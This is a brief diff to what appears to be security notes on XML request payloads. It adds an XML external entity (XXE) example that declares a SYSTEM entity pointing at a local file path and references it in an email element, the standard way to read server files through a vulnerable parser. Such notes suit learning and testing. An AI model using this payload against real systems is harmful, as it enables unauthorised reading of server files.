@@ -8,7 +8,12 @@ in request:
 lub
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
+<!DOCTYPE foo [ <!ENTITY xxe "my entity value" > ]>
+
+lub
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///path/to/somefile.txt"> ]>
 
 <email>&xxe;</email>
 
